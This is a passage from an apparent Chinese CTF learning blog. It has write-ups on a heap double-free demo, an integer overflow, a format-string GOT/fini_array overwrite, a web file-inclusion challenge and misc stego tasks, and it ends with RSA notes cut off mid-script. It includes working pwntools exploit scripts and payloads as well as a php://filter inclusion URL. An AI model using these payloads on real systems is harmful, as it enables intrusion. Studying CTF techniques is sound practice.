title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>前一个例子我们讲的是通过在fastbin中插入一个chunk来绕过double_free的检测，而本例中，学习的是通过largebin中的<br>consolidate函数来绕过检测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x40);</span><br><span class="line">  void* p2 = malloc(0x40);</span><br><span class="line">  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);</span><br><span class="line">  fprintf(stderr, &quot;Now free p1!\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(0x400);</span><br><span class="line">  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);</span><br><span class="line">  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序运行界面如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1=0x866010 p2=0x866060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x8660b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x866010 0x866010</span><br></pre></td></tr></table></figure><p>首先先创建两个大小为0x40的chunk，然后先释放p1。然后，我们在申请一个large_chunk。当我们申请large chunk时，会判断<br>当前fastbin中是否有chunk，有的话就会触发consolidate机制，将fastbin中的chunk移入unsorted bin中。分配之后，这些<br>chunk会按照大小被放回small bin或者large bin。这里，p1会被放回small bin。这个时候p1已经不在fastbin的表头，我们<br>就可以再次释放p1。</p><hr><p>今天就大致总结到这里，下次就开始总结unlink的相关内容。</p>]]></content>
      
      
      
        <tags>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-format2-整数溢出</title>
      <link href="/2019/11/20/XCTF-format2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2019/11/20/XCTF-format2-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>本文是对一道比较基础的整数溢出题目的解析，其中运用到的一些有关汇编的知识是自己之前没有接触过的，复盘一下收获颇丰，下<br>面我们来看一下吧。</p><a id="more"></a><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>ida看一下程序：<br><img src="/img/format2/1.jpg" alt="avatar"></p><p>程序首先会对输入进行base64解密，然后对解密后的文本限制长度为12字节</p><p><img src="/img/format2/2.jpg" alt="avatar"></p><p>这里就是程序漏洞的所在了，v4是一个整型，只有八个字节，这里存在一个整数溢出，利用这个漏洞就可以控制auth函数的ebp</p><p><img src="/img/format2/3.jpg" alt="avatar"></p><p>这是一个后门函数，我们需要做的就是控制程序流运行后门程序。</p><h2 id="漏洞的具体利用"><a href="#漏洞的具体利用" class="headerlink" title="漏洞的具体利用"></a>漏洞的具体利用</h2><p>要利用这个漏洞，我们首先就要对汇编语言有一定的了解。<br>当main函数要进入auth函数时，会先进行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">move esp,ebp</span><br><span class="line">sub esp,0x28</span><br></pre></td></tr></table></figure><p>所以auth的ebp就是main的ebp，而在main函数中，最后是leave ，retn<br><img src="/img/format2/4.jpg" alt="avatar"><br>这样我们先修改ebp的值为input_addr,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move esp,ebp  /esp的值变为input_addr</span><br><span class="line">pop ebp</span><br><span class="line">retn(pop rip)  //控制程序流 即call (ebp+4)</span><br></pre></td></tr></table></figure><p>这样我们就可以get shell</p><h2 id="脚本实现"><a href="#脚本实现" class="headerlink" title="脚本实现"></a>脚本实现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">p = process(&apos;./format&apos;)</span><br><span class="line">system = 0x8049284 </span><br><span class="line">input_addr = 0x811eb40</span><br><span class="line">p.recvuntil(&apos;Authenticate : &apos;)</span><br><span class="line">payload = &apos;a&apos;*4 + p32(system) + p32(input_addr)</span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mma-ctf-2nd-2016-greeting-150</title>
      <link href="/2019/11/18/mma-ctf-2nd-2016-greeting-150/"/>
      <url>/2019/11/18/mma-ctf-2nd-2016-greeting-150/</url>
      
        <content type="html"><![CDATA[<p>一道比较好的格式化字符串，通过这道题目可以有效训练自己构造payload的能力</p><a id="more"></a><h2 id="漏洞的大致分析"><a href="#漏洞的大致分析" class="headerlink" title="漏洞的大致分析"></a>漏洞的大致分析</h2><p>我们在linux中分析之后发现这是一个32位的程序，开启了NX保护和canary<br><img src="/img/greeting/1.jpg" alt="avatar"><br>通过ida逆向一下<br><img src="/img/greeting/2.jpg" alt="avatar"><br>我们发现这里有一个很明显的格式化字符串漏洞，这样我们就可以通过修改函数的got表为system的plt来实现我们的目的。</p><h2 id="漏洞的具体利用方式"><a href="#漏洞的具体利用方式" class="headerlink" title="漏洞的具体利用方式"></a>漏洞的具体利用方式</h2><p>我首先使用了一个计算格式化字符串偏移的通用脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># fmt_test.py</span><br><span class="line">#! /usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(&quot;./pwn&quot;)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    info = p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    return info</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">print autofmt.offset</span><br></pre></td></tr></table></figure><p>得到格式化字符串偏移为12<br>又经过测试：<br><img src="/img/greeting/3.jpg" alt="avatar"><br>这里我们到时候在写payload的时候需要填充两个字符(其实我也不知道为什么……)</p><p>本程序是没有循环的，所以我们需要修改程序的fina_array为start地址，这样就会重新执行一遍，然后执行到我们修改的函数，<br>就可以cat flag<br>所以这样，我们就需要修改的就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strlen-&gt;system  0x08049A54-&gt; 0x08048490</span><br><span class="line">fina_array-&gt;start  0x08049934-&gt; 0x080484f0</span><br></pre></td></tr></table></figure><p>这样我们就可以开始构造我们的payload了<br>由于我们要修改的地址较大，在构造payload的时候就要采用%k&amp;hn的方式来修改两个字节，这样可以提高效率</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;aa&apos;</span><br><span class="line">payload += p32(fina_array) </span><br><span class="line">payload += p32(strlen_got+2)</span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += &apos;%34000c%12$hn&apos;  //首先写入(34000+32)个字符来修改fina_array的后两个字节，这里34032=0x84f0</span><br><span class="line">payload += &apos;%33556c%13$hn&apos;  //33556+34032=0x10804，由于hn只写入两个字节，所以0x10000忽略，写入0x804</span><br><span class="line">payload += &apos;%31844c%14$hn&apos;  //31844+0x10804=0x18490,写入0x8490</span><br></pre></td></tr></table></figure><p>至此我们成功构造出了我们的payload</p><h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">#p = remote(&apos;111.198.29.45&apos;,47537)</span><br><span class="line">strlen_got = 0x08049a54</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">fina_array = 0x08049934</span><br><span class="line">start = 0x080484f0</span><br><span class="line">payload = &apos;aa&apos;</span><br><span class="line">payload += p32(fina_array) </span><br><span class="line">payload += p32(strlen_got+2)</span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += &apos;%34000c%12$hn&apos;  </span><br><span class="line">payload += &apos;%33556c%13$hn&apos;  </span><br><span class="line">payload += &apos;%31884c%14$hn&apos;  </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>通过这道题的学习，自己对格式化字符串的理解加深了不少，其实这类题目最重要的还是payload需要构造的巧妙，只要理解了格式化<br>字符串漏洞，以后面对这一类的问题就能够游刃有余了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MCTF初赛WP(1)</title>
      <link href="/2019/10/17/MCTF%E5%88%9D%E8%B5%9BWP-1/"/>
      <url>/2019/10/17/MCTF%E5%88%9D%E8%B5%9BWP-1/</url>
      
        <content type="html"><![CDATA[<p>这次校赛是我们17的大佬组织的，题目全都是大佬出的，自己做了一下，题目质量挺高的，有难题也有对新手比较友好的题目，下面<br>的WP。</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>平时没怎么看web题真的是太伤了，这次校赛自己的劣势就很大。所以只能看看那些比较简单的题目。</p><h3 id="欢迎入坑"><a href="#欢迎入坑" class="headerlink" title="欢迎入坑"></a>欢迎入坑</h3><p>这道题真的是非常友好了，直接f12看一下网页的源代码，发现flag就在里面： mctf{Ba1du_Y0u_know}</p><h3 id="白驹过隙"><a href="#白驹过隙" class="headerlink" title="白驹过隙"></a>白驹过隙</h3><p>这道题打开网址之后会发生一次跳转，跳到百度上面去，所以只要ctrl+u查看源代码可以看到跳转之前的源代码</p><p><img src="/img/%E7%99%BD%E9%A9%B9%E8%BF%87%E9%9A%99.jpg" alt="avatar"></p><h3 id="隐藏信息"><a href="#隐藏信息" class="headerlink" title="隐藏信息"></a>隐藏信息</h3><p>点进去以后是一个比较复杂的网页，直接看源代码发现有个‘ctf photo’，所以联想到与背景图片有关系<br>用火狐浏览器打开后可以直接查看背景，得到flag</p><p><img src="/img/%E9%9A%90%E8%97%8F%E4%BF%A1%E6%81%AF.jpg" alt="avatar"></p><h3 id="拜拜了您"><a href="#拜拜了您" class="headerlink" title="拜拜了您"></a>拜拜了您</h3><p>这道题进入后有一个click me？点击后发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.26.247:8088/3a3e05990bf99eb34/index.php?file=show.php</span><br></pre></td></tr></table></figure><p>所以这里有一个文件包含的漏洞<br>构造如下url来泄露源码base64值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.26.247:8088/3a3e05990bf99eb34/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>将得到的base64解码就是flag了<br><img src="/img/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.jpg" alt="avatar"></p><h3 id="技术大牛"><a href="#技术大牛" class="headerlink" title="技术大牛"></a>技术大牛</h3><p>一开始以为是有什么注入的漏洞啥的，最后发现是一个弱口令….好吧<br>用户名是admin，密码是admin123 直接进入就是flag</p><h3 id="剁手"><a href="#剁手" class="headerlink" title="剁手"></a>剁手</h3><p>打开以后说是知名购物网站，直接输入淘宝试一试，发现说只能用10.10.10.10访问，所以就抓包把host改成了10.10.10.10<br>发现出现了只能用xp访问，就再把user agent改到xp版本，结果又出现了你从哪儿来的呀……好吧。最后在度娘的帮助下，才知<br>道应该把Referer改成<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ,最后得到flag：<br><img src="/img/%E5%89%81%E6%89%8B.jpg" alt="avatar"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>这次的杂项题还是很有趣的，也是让人脑洞大开。</p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>这道题就不用多描述了，毕竟是签到题</p><h3 id="数学大礼包"><a href="#数学大礼包" class="headerlink" title="数学大礼包"></a>数学大礼包</h3><p>这道题目比较有趣，只要是数学功底比较好的人都是能够很容易的得出答案的。题目给了三段flag，第一段是一个斐波那契，第二段是<br>一个求概率，第三段是求等边三角形的内切圆面积。<br>这里斐波那契只需要写一个很简单的脚本就可以了。大一时候写的都是c的，这次用python写发现可以简单很多，得出第六十六个是27<br>777890035288<br>然后是三双鞋概率，算出是3/5.最后一个边长10根号3等边三角形内切圆面积则是25pi<br>所以得出flag：MCTF{27777890035288-3/5-25pi}</p><h3 id="另一种方式"><a href="#另一种方式" class="headerlink" title="另一种方式"></a>另一种方式</h3><p>这道题是一个多重base64编码，由于编码后的文本长度比较大，就不放在wp里面了。简单的贴一下自己的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a = open(&apos;aaa.txt&apos;,&apos;ra&apos;).read()</span><br><span class="line">#print a </span><br><span class="line"></span><br><span class="line">for i in range(19):</span><br><span class="line">a=base64.b64decode(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure><p>运行之后得到flag<br><img src="/img/%E6%96%B0%E7%9A%84%E6%96%B9%E5%BC%8F.jpg" alt="avatar"></p><h3 id="难上加难"><a href="#难上加难" class="headerlink" title="难上加难"></a>难上加难</h3><p>这道题给了我们一张jpg图片，理所当然的binwalk跑一下，发现分解出了一张标识符损坏的二维码图片，手残而且不会ps的我花了很长的时间才修复好</p><h3 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h3><p>这道题拿到手之后很容易就发现，他的长和宽好像是不匹配的，所以想到了改图片的尺寸<br>丢到winhex里面<br><img src="/img/%E5%9B%BE%E7%A7%8D1.jpg" alt="avatar"></p><p>只要把这两个数值改成一样的就可以了</p><p><img src="/img/%E5%9B%BE%E7%A7%8D2.jpg" alt="avatar"><br>得到flag</p><h3 id="easy-lsb"><a href="#easy-lsb" class="headerlink" title="easy lsb"></a>easy lsb</h3><p>这道题拿到手就知道是一道lsb隐写的题，师兄也很贴心的给出了脚本。<br>这里我们由于忘记了脚本用法，我们就先空跑一下脚本<br>发现他给出了使用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py </span><br><span class="line">LSB steganogprahy. Hide files within least significant bits of images.</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;</span><br><span class="line">  lsb.py analyse &lt;stego_file&gt;</span><br></pre></td></tr></table></figure><p>我们需要用到的应该是第二个，所以我们还是需要知道这道题的加密密码。一开始我用文件名和github都试了一下，发现不对，最后<br>才想起来出题师兄比较自恋，所以用他的名字尝试了一下，居然真的对了！emmmmmmmm<br>flag：MCTF{lsb_do_u_find_it}</p><h3 id="奇怪的数字"><a href="#奇怪的数字" class="headerlink" title="奇怪的数字"></a>奇怪的数字</h3><p>拿到题目就有种熟悉又陌生的感觉，后来想起来这道题和今年上半年西湖论剑杯的一道TTL隐写题差不多，不过那时候我还是个小菜鸡<br>。这道题给了一大串数字，不过浏览一下以后发现其实只有127,191,63和255四种数字，。然后我们把它们全部转成二进制试一试，惊喜发现他们的后六位全部都是一样的，前两位则分别是00,01，10,11，于是就尝试先利用脚本吧他们的前两位全部拼接起来转成16<br>进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">f = open(&apos;txt.txt&apos;,&apos;rw&apos;).readlines()</span><br><span class="line">b = []</span><br><span class="line">for i in f:</span><br><span class="line">b.append(int(i))</span><br><span class="line">string = &apos;&apos;</span><br><span class="line">for i in b:</span><br><span class="line">if i == 255:</span><br><span class="line">string+=&apos;11&apos;</span><br><span class="line">elif i == 191:</span><br><span class="line">string+=&apos;10&apos;</span><br><span class="line">elif i == 127:</span><br><span class="line">string += &apos;01&apos;</span><br><span class="line">elif i == 63:</span><br><span class="line">string += &apos;00&apos;</span><br><span class="line">#print string</span><br><span class="line">c = &apos;&apos;</span><br><span class="line">for i in range(0,len(string),8):</span><br><span class="line">c+=chr(int(string[i:i+8],2))</span><br><span class="line">print c</span><br></pre></td></tr></table></figure><p><img src="/img/ttl1.jpg" alt="avatar"></p><p>这里可以看到这是一个ffd8开头的文件，这其实就是一个jpg格式的文件了，继续写脚本把它转换成图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">f = open(&apos;txt.txt&apos;,&apos;rw&apos;).readlines()</span><br><span class="line">b = []</span><br><span class="line">for i in f:</span><br><span class="line">b.append(int(i))</span><br><span class="line">string = &apos;&apos;</span><br><span class="line">for i in b:</span><br><span class="line">if i == 255:</span><br><span class="line">string+=&apos;11&apos;</span><br><span class="line">elif i == 191:</span><br><span class="line">string+=&apos;10&apos;</span><br><span class="line">elif i == 127:</span><br><span class="line">string += &apos;01&apos;</span><br><span class="line">elif i == 63:</span><br><span class="line">string += &apos;00&apos;</span><br><span class="line">#print string</span><br><span class="line">c = &apos;&apos;</span><br><span class="line">for i in range(0,len(string),8):</span><br><span class="line">c+=chr(int(string[i:i+8],2))</span><br><span class="line">print c</span><br><span class="line">c = binascii.unhexlify(c)  #将16进制转化为2进制</span><br><span class="line">d = open(&apos;img.jpg&apos;,&apos;w&apos;)</span><br><span class="line">d.write(c)</span><br><span class="line">d.close()</span><br></pre></td></tr></table></figure><p>查看以后发现一部分二维码<br><img src="/img/ttl.jpg" alt="avatar"><br>把二维码放入stegsolve，分析图层，发现有一共六张二维码，保存之后拼一下，就是完整的二维码</p><p>扫码得到“key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}”<br>看到这个首先尝试AutoKey密码解密，发现答案错误，所以尝试一下用维吉尼亚密码，对了<br>flag{2028ab39927df1d96e6a12b03j58002v}</p><h3 id="小文件"><a href="#小文件" class="headerlink" title="小文件"></a>小文件</h3><p>小文件打开下载的压缩包发现有八个txt文件，压缩包是经过加密的。但是观察之后发现每一个txt文件的大小都是5个字节，这就让<br>我想到了CRC32爆破。百度查阅了一下资料，虽然没有现成的5位爆破脚本，但是还是有可以借鉴的一些博客，最后贴上自己的爆破<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">def crack():</span><br><span class="line"></span><br><span class="line">crcs = [0x0a4af641,0x299bb815,0x2d978ea0,0x33caa3a4,0x99691d6d,0xa251850c,0xaecac058,0xe2ed6d65]</span><br><span class="line">r = xrange(32,127)</span><br><span class="line">for a in r:</span><br><span class="line">for b in r:</span><br><span class="line">for c in r:</span><br><span class="line">for d in r:</span><br><span class="line">for e in r:</span><br><span class="line">txt = chr(a)+chr(b)+chr(c)+chr(d)+chr(e)</span><br><span class="line">crc = binascii.crc32(txt)</span><br><span class="line">for i in crcs:</span><br><span class="line">if (crc&amp;0xffffffff) == i:</span><br><span class="line">print txt</span><br><span class="line">print i</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">crack()</span><br></pre></td></tr></table></figure><p>写脚本能力有限，跑得很慢，一觉睡醒发现终于全部跑完了<br><img src="/img/crc32.jpg" alt="avatar"><br>还是要学习一下多线程的爆破，要不这种爆破脚本效率实在是太低了</p><h2 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初次学习RSA密码</title>
      <link href="/2019/09/10/%E5%88%9D%E6%AC%A1%E5%AD%A6%E4%B9%A0RSA%E5%AF%86%E7%A0%81/"/>
      <url>/2019/09/10/%E5%88%9D%E6%AC%A1%E5%AD%A6%E4%B9%A0RSA%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>   ctf比赛中，密码是十分重要的一块内容，而这其中RSA密码也是最重要最基础的一块，所以今天就花一点时间来好好总结梳理<br>一下RSA密码的各种知识。</p><a id="more"></a><h2 id="RSA密码的基本知识"><a href="#RSA密码的基本知识" class="headerlink" title="RSA密码的基本知识"></a>RSA密码的基本知识</h2><p>要学习RSA密码，我们首先需要了解的就是它的一些基本原理。RSA加密，是一种利用公钥私钥对明文进行加密的一种加密算法，其中运<br>用了很多数学知识，现在我们先来把这些数学知识梳理一下。</p><h3 id="素数，互质数"><a href="#素数，互质数" class="headerlink" title="素数，互质数"></a>素数，互质数</h3><p>素数：一个数如果出了1和它本身之外没有其他的因数，那么就是一个素数。这是一个很简单的数学概念。</p><p>互质数：如果两个整数a,b的最大公因数（greatest common divisor）为1，即gcb(a,b)=1，那么称a,b两数互质</p><h3 id="欧拉函数值"><a href="#欧拉函数值" class="headerlink" title="欧拉函数值"></a>欧拉函数值</h3><p>设m为正整数，则1,2,3,4…….,m中与m互素的整数的个数记为φ(m)，叫做欧拉函数，欧拉函数的值叫做欧拉函数值。</p><h3 id="取模运算与同余"><a href="#取模运算与同余" class="headerlink" title="取模运算与同余"></a>取模运算与同余</h3><p>模运算即求余运算。“模”是“Mod”的音译。和模运算紧密相关的一个概念是“同余”。数学上，当两个整数除以同一个正整数，若得相同余<br>数，则二整数同余。<br>两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)<br>；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。</p><h3 id="模指数运算"><a href="#模指数运算" class="headerlink" title="模指数运算"></a>模指数运算</h3><p>模指数运算即先进行指数运算，在进行模运算</p><h2 id="RSA加密算法"><a href="#RSA加密算法" class="headerlink" title="RSA加密算法"></a>RSA加密算法</h2><h3 id="RSA加密涉及元素"><a href="#RSA加密涉及元素" class="headerlink" title="RSA加密涉及元素"></a>RSA加密涉及元素</h3><p>N：大整数N，我们称之为模数（modulus）<br>p 和 q ：大整数N的两个因子（factor）<br>e 和 d：互为模反数的两个指数（exponent）<br>c 和 m：分别是密文和明文，这里一般指的是一个十进制的数还有一个就是n的欧拉函数值，在求解d的时候常用</p><h3 id="算法的实现"><a href="#算法的实现" class="headerlink" title="算法的实现"></a>算法的实现</h3><p>N = p<em>q<br>1.φ(n) = (p-1)(q-1) ;这里的φ(n)即为n的欧拉函数值<br>2.选择一个e(1&lt; e &lt;φ(n))<br>3.d</em>e ≡ 1 (mod φ(n)),求出d</p><p>最后，以{e,n}为公开密钥，以{d,n}为秘密秘钥</p><p>在知道这些信息之后，我们就可以开始进行数据的加密和解密了</p><p>我们假设Bob要向Alice发送一些信息m，Bob知道的是公钥{e，n}，然后计算密文 c ≡ ^e (mod n)，然后就可以把密文c发送给Al<br>ice了。</p><p>接收方Alice在接收到信息c之后，就可以用自己掌握的私钥{d，n}计算 m ≡ c^d (mod n) ///φ(n)也可写成phi</p><p>这就是最基本的RSA算法的加解密方式，从这里我们也可以开始探索最简单的RSA攻击方法</p><h2 id="针对RSA加密的各种攻击方法"><a href="#针对RSA加密的各种攻击方法" class="headerlink" title="针对RSA加密的各种攻击方法"></a>针对RSA加密的各种攻击方法</h2><h3 id="针对模数n的因数分解"><a href="#针对模数n的因数分解" class="headerlink" title="针对模数n的因数分解"></a>针对模数n的因数分解</h3><p>分解模数n是最简单的但同时也是最困难的一种攻击方式。在我们掌握了这次加密的公钥e和模数n后，如果我们可以将n分解成p和q，<br>我们就可以计算出phi = (p-1)(q-1)</p><p>这里我们可以看一下实验吧的一道RSA题目：</p><p><img src="/img/RSA1.jpg" alt="avatar"></p><p>这道题很直接的给出了公钥n，e，所以我们只要分解出p和q，这道题就好了。<br>首先分解模数n,这里我们可以采用在线分解模数的方法，推荐链接：<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a><br>分解出来p = 18443,q = 49891<br>这样我们自己写一个脚本快速求解了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = gmpy2.mpz(18443)   #初始化大数</span><br><span class="line">q = gmpy2.mpz(49891)</span><br><span class="line">n = 920139713</span><br><span class="line">e = gmpy2.mpz(19)</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)   </span><br><span class="line">print d</span><br><span class="line">c = open(&apos;key.txt&apos;,&apos;ra&apos;).read().split(&apos;\r\n&apos;)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in 